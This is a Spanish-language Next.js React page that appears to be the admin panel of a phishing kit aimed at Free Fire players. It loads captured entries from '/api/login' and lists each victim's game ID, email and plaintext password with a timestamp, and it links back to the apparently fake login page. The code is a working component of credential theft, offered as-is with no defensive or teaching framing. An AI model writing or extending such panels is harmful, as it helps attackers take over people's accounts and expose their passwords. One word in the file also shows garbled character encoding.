"use client"

import { useEffect, useState } from "react"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"

export default function Registros() {
  const [registros, setRegistros] = useState([])

  useEffect(() => {
    const cargarRegistros = async () => {
      try {
        const res = await fetch('/api/login')
        const data = await res.json()
        setRegistros(data)
      } catch (error) {
        console.error('Error al cargar registros:', error)
      }
    }
    cargarRegistros()
  }, [])

  return (
    <main className="min-h-screen bg-black text-green-500 p-8">
      <div className="max-w-4xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-2xl">{'>'} BASE DE DATOS DE REGISTROS</h1>
          <Button 
            asChild
            variant="outline" 
            className="border-green-500 text-green-500 hover:bg-green-500 hover:text-black"
          >
            <a href="/">{'<<'} VOLVER AL LOGIN</a>
          </Button>
        </div>
        
        <div className="space-y-4">
          {registros.length === 0 ? (
            <Card className="p-6 border border-green-500 bg-black">
              <p>{'>>'} No hay registros en la base de datos...</p>
            </Card>
          ) : (
            registros.map((registro: any, index: number) => (
              <Card key={index} className="p-6 border border-green-500 bg-black">
                <div className="space-y-2">
                  <p className="text-lg font-bold">{'>>'} REGISTRO #{index + 1}</p>
                  <p>{'>'} ID FreeFire: {registro.id}</p>
                  <p>{'>'} Correo: {registro.email}</p>
                  <p>{'>'} Contrase√±a: {registro.password}</p>
                  <p className="text-sm opacity-70">{'>'} Fecha: {new Date(registro.timestamp).toLocaleString('es-ES')}</p>
                </div>
              </Card>
            ))
          )}
        </div>
      </div>
    </main>
  )
}
